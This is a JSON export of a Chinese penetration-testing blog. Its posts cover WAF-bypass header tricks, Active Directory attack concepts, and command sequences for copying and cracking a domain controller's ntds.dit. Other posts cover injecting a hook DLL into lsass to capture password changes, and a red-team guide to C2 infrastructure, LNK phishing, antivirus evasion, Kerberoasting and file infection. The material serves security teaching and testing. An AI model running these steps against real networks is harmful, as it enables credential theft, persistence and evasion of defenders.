{"meta":{"title":"渗透测试随笔","subtitle":null,"description":"每周一更，与人共勉。","author":"Saitama","url":"https://wanpan1996.github.io","root":"/"},"posts":[{"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://wanpan1996.github.io/tags/web渗透/"}],"title":"web 头部欺骗","date":"2020/03/06","text":"自定义来源地址 X-Originating-IP:127.0.0.1 X-Forwarded-For:127.0.0.1 X-Remote-IP:127.0.0.1 X-Remote-addr:127.0.0.1 X-Client-IP:127.0.0.1 X-Real-ip:127.0.0.1 存控制字段指令： Cache-control: no-transform (当数据包存在该字段的时候，代理服务器不会解析该数据，而是发送到源服务器） tp Piplne绕过（keep-alive) connection: keep-alive 可以同时发送多个请求,如果waf只检查第一个请求 便可以绕过 Http 协议未覆盖绕过 修改http头中 Content-Type字段的值 HTTP畸形解析 head头的content-type: TAB Host添加空格 Host域名后面添加“.” Cookie中垃圾数据填充 filename在content-type下面 Content-Type: multipart/form-data; boundary = 0000 Content-Type: multipart/Form-datA; boundary = 0000 Content-Type: multipart/form-dataX; boundary = 0000 ……","permalink":"https://wanpan1996.github.io/2020/03/06/web-头部欺骗/","photos":[]},{"tags":[],"title":"域渗透全集-kerberos篇-1","date":"2020/01/05","text":"","permalink":"https://wanpan1996.github.io/2020/01/05/域渗透全集-kerberos篇-1/","photos":[]},{"tags":[],"title":"github-安全资源集合（推荐）","date":"2019/12/15","text":"优秀的安全资源集合1.sec-tool-list: 超过16000安全工具, 按Github星数排序,包括Markdown和Json两种格式 https://github.com/alphaSeclab/sec-tool-list 2.awesome-cyber-security: 网络安全资源收集, 包括9000左右工具,按功能进行基本分类 https://github.com/alphaSeclab/awesome-cyber-security 3.awesome-reverse-engineering: 逆向资源收集,包括各个平台(Windows/Linux/macOS/Android/iOS/IoT), 包括各种逆向工具和文章 https://github.com/alphaSeclab/awesome-reverse-engineering","permalink":"https://wanpan1996.github.io/2019/12/15/github-安全资源集合（推荐）/","photos":[]},{"tags":[{"name":"域渗透全集","slug":"域渗透全集","permalink":"https://wanpan1996.github.io/tags/域渗透全集/"}],"title":"域渗透全集-技巧-2","date":"2019/09/21","text":"使用 shell 远程转储”DC” 用户数据库Demo: 远程连接到DC 使用psexec 调用vssadmin 查看结果 》》也可以使用 “&gt;&gt;”将结果传回本地。 创建卷影 查看一下结果 复制ntds.dit 复制system (解开ntds需要使用) 查看一下结果 文件可能很大，可灵活选择在DC上解密或者下载回本地 secretsdump.exe -ntds ntds.dit -system SYSTEM local 删除卷影 删除痕迹。。。。。。 命令： net use \\192.168.1.38\\C$ “Admin12345” /user:god\\administratorpsexec \\192.168.1.38 -h cmd /c “vssadmin list shadows &gt;&gt; C:\\out.txt”type \\192.168.1.38\\C$\\out.txtpsexec \\192.168.1.38 -h cmd /c “vssadmin create shadow /for=c: &gt; C:\\out.txt”type \\192.168.1.38\\C$\\out.txtpsexec \\192.168.1.38 -h cmd /c “copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit C:&quot;dir \\192.168.1.38\\C$psexec \\192.168.1.38 -h cmd /c “copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\system32\\config\\system C:&quot;dir \\192.168.1.38\\C$psexec \\192.168.1.38 -h cmd /c “vssadmin delete shadows /for=c: /quiet” 可以参照——– 内网渗透 Tips1抓取域内用户的hash PS: PsExec 会留下操作日志。 PsExec 异常退出会在目标上保留进程。 低版本PsExec 明文传输。。。。 PsExec工作方式原理 https://www.itprotoday.com/compute-engines/psexec PsExec 返回的错误代码特定于您执行的应用程序，而不是PsExec wmi 更好一点。","permalink":"https://wanpan1996.github.io/2019/09/21/域渗透全集-域渗透技巧-2/","photos":[]},{"tags":[{"name":"域渗透全集","slug":"域渗透全集","permalink":"https://wanpan1996.github.io/tags/域渗透全集/"}],"title":"域渗透全集-技巧-1","date":"2019/09/21","text":"IPC$的正确连接姿势: Windows net use \\192.168.3.29 “Admin12345” /user:GOD\\Administratornet use \\192.168.3.29 “Admin12345” /user:Administrator Linux sudo apt install smbclient$ smbclient -L 192.168.3.29 -U administrator$ smbclient \\\\192.168.3.29\\C$ -U administrator$smbclient -L 192.168.3.29 -U GOD\\Administrator Runas /netonly 的使用 runas /netonly /user:god.org\\administrator cmd 好处: 可以在一台机器上产生多个用户上下文的CMD窗口 只有在有网络连接的时候才产生身份CHECK 在加入域和没加入域的主机上都可以运行 在Linux上侦查AD的方法 rpcclient -U god.org/administratorr 192.168.3.29rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[employeeA] rid:[0x454]rpcclient $&gt; queryuser 0x1f4 在OSX上找DC的方法(当前机器已经加入了DOMAIN) dsconfigad -show | awk ‘/Active Directory Domain/{print $NF}’corp.pentest.lab $ host -av _ldap._tcp.corp.pentest.lab 导出当前域所有的用户信息：$ ldapsearch -h 172.31.4.212 -p 389 -x -b “cn=sers,dc=corp,dc=pentest,dc=lab” -W -D administratorEnter LDAP Password:对于用户多的域环境,慎用该命令,输出文件会非常大 执行AD远程帐号破解时,了解账户策略很重要 net accounts /domain 场景: 遇到一台机器,配置有WINDOWS FIREWALL,我懒得看规则了,直接stopNet stop MpsSvc,结果…应该: netsh advfirewall export “C:\\fw-rules.wfw”netsh advfirewall firewall show rule name=all dir=innetsh advfirewall firewall delete rule name=”Deny from 172.31.3.119”netsh advfirewall import “C:\\fw-rules.wfw” netsh实现端口转发: A. IPv4 port to another IPv4 port on the same/remote host B. IPv4 to IPv6 port conversion for a same/remote computer 推荐：https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#active-directory-reconnaissance","permalink":"https://wanpan1996.github.io/2019/09/21/域渗透全集-渗透技巧-1/","photos":[]},{"tags":[{"name":"域渗透全集","slug":"域渗透全集","permalink":"https://wanpan1996.github.io/tags/域渗透全集/"}],"title":"域渗透全集-AD基础概念，术语介绍","date":"2019/09/21","text":"AD的基础概念,常见术语Windows域简介见百度百科 AD的基础概念-1: AD是微软实现的目录服务,基于X.500工作在应用层,AD使用”Kerberos”认证用户以及使用LDAP来递归目录信息 DC控制所有用户,用户信息,计算机,以及策略.主要工作就是认证用户 在AD中所有网络资源都叫对象(Object),包括计算机,用户,打印机等等 域(Domain)是安全的边界.域内的对象可以彼此共享数据,所有对象的信息存储在DC中(ntds.dit) Domain-&gt;tree-&gt;Forest AD的基础概念-2： Group Policy:A Group Policy Object is a collection of settings systems administrators create with the Microsoft Management Console (MMC) Group Policy Editor. The GPO can be associated with one or more of the Active Directory containers, such as sites, domains, or organizational units (OUs). OU Objects 域是边界,森里扩展了该管理边界 作用域: 本地(计算机内),全局(域间),通用 (森林) 默认情况,域具有传递性,森林没有 信任关系:单向/双向/,可传递/不可传递 用户和组的概念 Administrator/LocalSystem: 本地计算机权限最高的2个用户 Domain Admins: 域里权限最高的 Enterprise Admins: 森林里权限最高的 Schema Admins: 这个组里的成员有权编辑目录结构,权限非常大 UAC: User Account Control: Admin Approval Mode for the built-in Administrator account (默认禁用) User Account Control: Run all administrators in Admin Approval Mode (默认启用) LM, NT, and NTLM (version 1 and 2) LM: LM was turned off by default starting in Windows Vista/Server 2008, but might still linger in a network if there older systems are still used NTHash (A.K.A. NTLM):pass-the-hash NTLMv1 (A.K.A. Net-NTLMv1) : The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and what is available (Responder) NTLMv2 (A.K.A. Net-NTLMv2): Default in Windows since Windows 2000. NTLMv1,NTLMv2能被用来Relay attack. Mimikatz/WCE为什么能抓到明文? 详见： https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Kheirkhabarov_Hunting_for_Credentials_Dumping_in_Windows_Environment.pdf 域,树,森林的概念简介见 https://zhidao.baidu.com/question/12014170.html AD通讯会涉及到哪些端口和协议 关于Kerberos认证 活动目录当前使用 Kerberos 身份验证，它本身有几个漏洞 Pass the Hash Pass the Ticket Golden Ticket Silver Ticket AD 曾经使用并且仍然支持 NTLM 加密，在当今的标准中，这种加密非常薄弱","permalink":"https://wanpan1996.github.io/2019/09/21/域渗透全集-AD基础概念，术语介绍/","photos":[]},{"tags":[{"name":"web渗透","slug":"web渗透","permalink":"https://wanpan1996.github.io/tags/web渗透/"}],"title":"PHP Webshell——disable_function方法大全","date":"2019/09/13","text":"前言在上传了webshell后 有时会遇到无法执行命令的问题，这时不要慌，冷静分析。","permalink":"https://wanpan1996.github.io/2019/09/13/PHP-Webshell——disable-function方法大全/","photos":[]},{"tags":[{"name":"权限维持","slug":"权限维持","permalink":"https://wanpan1996.github.io/tags/权限维持/"}],"title":"权限维持-Hook-PasswordChangeNotify","date":"2019/08/23","text":"背景知识需要了解的相关背景知识如下： 在修改域控密码时会进行如下同步操作： 当修改域控密码时，LSA首先调用PasswordFileter来判断新密码是否符合密码复杂度要求 如果符合，LSA接着调用PasswordChangeNotify在系统上同步更新密码 函数PasswordChangeNotify存在于rassfm.dll rassfm.dll可理解为Remote Access Subauthentication dll，只存在于在Server系统下，xp、win7、win8等均不存在 可以使用dumpbin查看rassfm.dll导出函数来验证结论2： #!bash dumpbin /exports c:\\windows\\system32\\rassfm.dll 目标环境 Windows server 2012 R2Windwos server 2008 R2 操作步骤 生成Hook dll 下载链接：https://github.com/clymb3r/Misc-Windows-Hacking（1）为PasswordChangeNotify创建一个内联Hook，将初始函数重定向到PasswordChangeNotifyHook（2）在PasswordChangeNotifyHook中实现记录密码的操作，然后重新将控制权交给PasswordChangeNotify DLL注入 可以利用Powershell技巧中的Process Injection将我们自己编写的dll注入到lsass进程，实现Hook功能。这里附上三好学生大佬修改过的代码：https://github.com/3gstudent/Hook-PasswordChangeNotify下载代码后修改最后一行为 1Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass （1）这里我使用VS2017生成的dll，生成时需要把MFC设置为在静态库中使用MFC 将生成好的dll文件和下载的dll注入脚本上传到目标系统（注意必须是server系统） 执行脚本 1PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1 然后我们修改一下密码试试： 在C:\\windows\\temp下找到password.txt 关于Hook-PasswordChangeNotify 当然还有更厉害的方法，比如把记录的密码直接发送到我们的服务器上，等等。这就靠大家自己研究啦。以上的思路和方法都是前辈们辛苦研究的，我只是把自己前段时间解决问题的方法列了出来，不足之处还请指正。以上的操作都是在开启杀软的情况下进行的。","permalink":"https://wanpan1996.github.io/2019/08/23/tips3/","photos":[]},{"tags":[{"name":"红队资源","slug":"红队资源","permalink":"https://wanpan1996.github.io/tags/红队资源/"}],"title":"红队渗透流程","date":"2019/08/22","text":"Summary 情报收集与外网打点 基础设施架构设计部署普通架构：红队人员–》teamserver cs–》目标机缺点：功能未分离、无潜伏通道、回连日志多、灵活性较低 演进架构：DNS/HTTP/HTTPS分离servertips：1~2cpu 2G内存 10G硬盘，回连数不超过5台，潜伏通道（根据实际目标环境优先） 完整架构： 域名和IP（VPS）teamserver（CS）前置机（redictor）CS -》teamservers 1/2/3/… 前置层（SMTP/PAYLOAD/C2/隐蔽C2） 选择域名 抢注过期域名 expireddomains.net DELETE DOMAIN tips1: 不要包含世界大厂和杀毒厂商相关的域名，以及和目标相关的域名 tips2：注册目标相关区域常见的域名，记得开隐私保护 其他：www.freshdrop.com www.domcop.com tips3：检查域名是否被分类，金融、医疗、电商、航空、旅游 great tips4：去VT、微步检查，域名是否被标黑 tips5：举报滥用规则仔细阅读（freenom 慎用） 培养域名（养号） 搭建正常域名，提交至各安全厂商给站点分类 tips1：把域名A记录解析到大厂ip，使用时候再解析到C2，不用时候解析回大厂ip tips2：VT 自评， alex 自评 域名解析检测 域名分类检测 domaincheck： IP检测 外网IP，通过情报站看是否被标黑 使用CDN隐藏真实IP（部分安全厂商会拦截CDN IP） 借鸡生蛋， subdomain takeover：高信誉域名A解析B -》 高信誉肉鸡做前置转发 C2工具 CS 3.14 自定义流量特征：DNS/HTTP/HTTPS/SMB和TCP Payload加载流程：shellcode/Loader/Stageless/beacon DNS：如果用到dns通道默认参数必须修改（容易被设备检测），不要用DNS做数据通道 HTTP（S）：不要在uri中的文件后缀设置js、css等静态文件，效果：付费证书&gt;免费证书&gt;自签名证书 （Let’s Encrypt 免费 3个月过期，开自动续） Redirector DNS socat|iptables|ssh（tmux和screen选一个） Apache|Nginx Tips： 建议使用多个判断过来请求，拒绝使用默认uri，对抗全网C2扫描 仅允许目标相关IP访问，对抗云沙盒 限定访问时间段，只在某个时间段请求payload 不要把非payload的uri重定向到google等高信誉域名 建议：在www.aaa.com搭建来养域名，使用c2.aaa.com的二级域名做C2 Domain Fronting（隐藏IP、域名的方式） Google App Engine| Amazon |Azure|Aliyun CDN 可见层：DNS、TLS 不可见层：HTTPS URL（高信誉） SNI（高信誉） HOST(C2) https://github.com/vysecurity/DomainFrontingLists 代替方案：HTTP pipelining（ &gt;http 1.1 ） 和 domain fronting 效果相同 利用同一个tcp连接发送不同的host的http包 tips：good domain + bad domain 包一层同时发过去 第三方服务用作C2 Office365、Pastebin、Slack、Facebook、Dropbox、Gmail、Twitter.. 需要硬编码到第三方服务 邮件钓鱼（SMTP） 域名：同C2域名选择 高信誉的邮件发送者：Mailchimp、Sendgrid 正确配置SPF、DKIM\\DMARC SSL证书 发送时间和频率 一键部署 钓鱼邮件框架：Gophish (https://github.com/gophish/gophish) 隐蔽性和安全性 权限最小化：使用iptalbes限定组件通讯，SSH进行端口转发 Teamserver：限制端口只能本地访问，限制beacon监听端口只能redirector访问 Tips：VPS容易被GFW拦截？ 解决方案：V2ray + Nginx + CLoudflare + Freenom+ Websocket 搭建代理 基础设施监控系统 记录完整日志，设置告警 自动化部署 LuWu（https://github.com/QAX-A-Team/LuWu） 日志中心 邮件钓鱼之前期信息收集与侦查 面临的技术挑战： 邮件网关 mail gateway 浏览器 EDR、IDS Mail Gateway ANTI-SPAM SPF DKIM 新注册域名 生僻域名后缀 敏感关键字 特性： 邮件退信默认开启 MTA默认不开启 Recipient Validation 结论：当我们发送一封钓鱼邮件给一个不存在的邮箱账户时，如果能收到NDR，证明钓鱼邮件通过了邮件网关安全审查（BACKSCATTER ATTACK） BYPASS ANTI-SPAM 通过上述结论，探测，fuzzing ANTI-SPAM 引擎规则 稳定触发NDR的办法： 正文大于10M 收件人超过5000个 BYPASS ANTI-MALWARE NDR 总结 钓鱼样本制作 钓鱼邮件类型 恶意的chm文档：利用easy，但目前比较难过杀软，免杀效果差 带有恶意宏代码的office文档：易于混淆（结合图片模糊之类），但需要手动开宏，进程链可疑 白加黑钓鱼：利用带签名的白程序，通过DLL劫持的方案加载恶意DLL；比较容易过AV，但需要解压执行 LNK文件钓鱼：链接对象是Powershell，进程链完善 PPT钓鱼样本：PPT超链接，弹出“安全声明”，不用启动宏，但必须全屏播放，启用才执行；不推荐使用 漏洞利用的钓鱼邮件：效率高，同样成本也高 写工具自动化生成恶意lnk，关键函数： IShellLink::SetIconLocation() IShellLink::SetShowCmd() 窗口显示 IShellLink::SetArguments() IShellLink::SetPath() … LNK钓鱼邮件制作 钓鱼简历的编写：内容可选浮夸，让HR打开看完后大概率删除，防止提给技术人员 LNK图标的显示：改成各个系统都能默认显示的通用图标 如何隐藏行为：SetShowCmd() 最小化窗口 Word文档存放： 联网下载Word文档 (New-Object System.Net.WebClient).DownloadFile(url, file_path); 数据还原引擎 协议内容还原：tcp、http、smtp 文件内容还原：office、pdf、zip 加壳程序还原：upx 加密算法数据还原：base64 本地释放Word文档 将Word塞到COMMAND_LINE_ARGUMENTS ARGUMENT用于LNK中存储命令行参数 StringData结构，CountCharacters IShellLink::SetArguments() 塞入数据的最大值是 explorer.exe 对命令行参数长度的限制 实测得出 0x7FC2（31KB） 将Word塞到lnk文件的尾部（推荐使用） 尾部可以追加任意大小的word、PE、PowerShell select -last 1 定位到最后一个对象，以“\\n”划分对象 select -index 1 也可以 杀软对抗 短文件名 POWERS~1.EXE 代码混淆 参考赛门铁克的paper 安全类进程检测 虚拟机-取证工具-杀软检测-调试器 常规手法 进程名检测 窗口标题检测 新姿势 遍历进程，获取进程对应的版权信息，与黑名单列表比对 优点：升级版本也不变，通用 如何根据PID获取进程的全路径：ProcessExplorer x86不太可行，x64可以 绕过PCHunter 0RING hook 检测后行为，通知攻击者，及时善后处理 内网横向移动 内网侦查 经典主被动内网侦查方式 主动扫描 设备资产识别 可用服务采集 脚本检测 被动搜集 监听广播消息 雷区警示 风险面：Network ACL封锁、受控主机HIDS、HoneyPot、NIDS 方法对比 域内信息侦查 * 类域 * *nix * Windows AD 定位域控（域内主机） 时间服务器 net time /domain w32tm /query DNS服务器 Get-DnsClientServerAddress 查询本机 DNS SERVER 设置 向DNS server 查询 Domain Name A记录对应地址 域控定位器 DC Locator Process 产生DNS查询，沿用DC Locator的机制很安全 Kerberos认证，KDC GC 查询工具 nltest 提取域控信息的过程 net dsquery 通过对LDAP进行查询 dsquery/ADSISearcher使用明文的LDAP协议，容易被IDS捕获 定位域控（域外主机） DNS排查 Scan UDP/53 Query DNS FQDN from DNS Query Locators from DNS LDAP（S）&amp; GC（S） 扫描端口，利用特性筛查域名 匿名读取部分LDAP元数据 读取LDAP证书信息 GC服务 查询 TCP/3268 TCP/3269 防御：可以关闭匿名绑定 查询LDAP（S）服务 ADexplorer：GUI，一些cmdlet Get-ADUser Powerview：大量cmdlet Kerberos AS-REQ &amp; AS-REP KDC TGT票据 基于AS协议的用户枚举 KERBEROSUSERENUM（a-team github） MSF模块 ASREPROAST Session Key，使用用户的NTHASH加密 John/HashCat 可以进行离线破解 SPN（Service Principal Name）域对象的属性，对象是机器/用户，必须设置 TGS-REQ &amp; TGS-REP 服务票据 Service Ticket 结论：普通域账号申请服务票据后可以对账号离线破解 KERBEROAST攻击（基于上述结论） Rubeus.exe PowerView HUNT DOMAIN ADMIN 特定用户登录会话 远程会话枚举 NetSessionEnum（SMB会话） NetWkstaUserEnum（交互登录会话）新版本系统需要 admin privilige 远程用户枚举 场景：一些同域管理账号同名的本地账号可能是同一人创建 SAMR 查询组和成员信息（注：Win 10后没有admin无法枚举） LSARPC 查询SID相关 远程登录枚举 交互式登陆：主要指Console和RDP登陆的方式 获取主机权限：Vul RBCD &amp; RPRN 提取遗留的凭据: Powerview Mimikatz 得到用户权限 横向移动 MS-RPC WMI：基于DCOM TCP/135 明文传输 PSEXEC：（tips：使用impacket工具 psexec.py 区别在于目标支持SMB3.0默认开启加密） 远程计划任务 DCOM：远程调用的COM组件 TCP/445 + Random port dcomexec.py Kerberos委派 概念：是一种让服务有能力以来访用户身份访问其他服务的认证机制 无限制委派：default设置仅域控可以无限制委派 S4U2SELF PRINTER BUG：Printer Spooler服务SSRF 无限制委派+S4U2SELF+PRINTER 任意域控 约束委派 S4U2PROXY 基于资源的委派（RBCD） 目前杀伤力最大的委派 继承S4U2SELF、S4U2PROXY 域权限维持 主机权限维持（常见类型，不展开） 域权限维持 SPN 针对账户进行，参考前面 黄金票据 用krbtgt加密TGT，TGT加密使用该账户的key作为密钥 使用默认参数创建的金票过期时间很长，mimikatz DCSync拉取域内账户的hash/key 检测点： krbtgt key，修改krbtgt密码两次，分析4769日志 日志分析 IDS规则，过期时间，算法等 白银票据 SRVS的相关key加密 检测点： PAC信息验证 受限委派 RBCD 域组策略 LAPS 文件感染与横向移动 文件感染 意义 场景 公司软件库供应链，类似“驱动人生” 感染远程共享文件 外界设备感染，如U盘、移动硬盘 3389挂载盘到服务器 邮件感染，插入恶意宏 流量劫持，感染传输中的文件 方式 PE感染 LNK感染 Office感染 常规PE感染 给exe添加一个导入函数，DllMain中写恶意代码，工具StudyPE 把恶意代码插入到PE中，修改OEP，重建PE OEP内某处跳转到恶意代码 修改OEP指向恶意代码 对抗思路 DLL加载 OEP jump 利用TLS（线程局部存储）回调 TLS感染 TLS回调，反调试；把恶意代码放在TLS，不需要修改OEP TLS数据结构 TLS感染总体流程：搜寻节间隙 - 修改录数据目 - 构建TLS目录 TLS回调函数 - 重建PE - 恶意文件释放 LNK文件 图标如何保持不变？ IShellLink::SetIconLocation()把exe设置为当前lnk的图标 恶意代码正常拉起原程序 借助rundll32.exe 场景：权限维持、横向移动 Office文件感染 .docx .docm（宏文件） 可以改为 .doc 目标：把.docx转换为带恶意宏的.docm或.doc 杀软对抗 修改文件关联 .docm 改为.doc，对抗针对后缀.docm 的检测 修改宏关联文件，对抗依赖文件名or类型检测 实战案例 略 本文转载至 https://github.com/Mel0day/RedTeam-BCS","permalink":"https://wanpan1996.github.io/2019/08/22/tips2/","photos":[]},{"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wanpan1996.github.io/tags/内网渗透/"}],"title":"内网渗透 Tips1","date":"2019/08/21","text":"前言： 有朋友可能在实战中会遇到这样的情况，域内设置策略每个月或者一段时间统一修改一次密码，而且密码是随机的。但是Sysvol共享脚本和GPP策略都没法拿到域内用户的hash或密码的时候，最直接的方式还是导出NTDS，当然这个需要在域控上操作。 目标环境介绍： 2台 windows server 2012 R2 域控服务器 ADC01 = 192.168.0.1 ADC02=192.168.0.2（备份） 马儿是system权限。 杀软为最新的趋势科技企业版 话不多说开撸：（由于目标不方便截图，本地环境复现） 开始测试Hash一般存储在两个地方：SAM文件，存储在本机对应本地用户,NTDS.DIT文件，存储在域控上对应域用户。 查看当前快照1vssadmin list shadows 创建快照1vssadmin create shadow /for=c: 复制ntds.dit1copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\NTDS\\ntds.dit c:\\ntds.dit 复制system.hiv1copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SYSTEM C:\\system.hiv 或者 1reg save hklm\\system C:\\system.hiv 删除快照1vssadmin delete shadows /for=c: /quiet 导出hash1ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC] 这里可以根据目标的情况来选择合适的方法，如果文件过大，可以把工具传到服务器上使用，反之可以把文件下载到本地解密。我使用的是ntdsdump这个工具，简单方便。 第一次使用会出现下面这个问题 不要慌张~输入 esentutl /p /o ntds.dit就可以修复。 然后在运行上一条命令就ok啦。 这样就获取到了当前域所有用户的账号和NTLM hash了。解密的话推荐使用彩虹表。","permalink":"https://wanpan1996.github.io/2019/08/21/tips1/","photos":[]}]}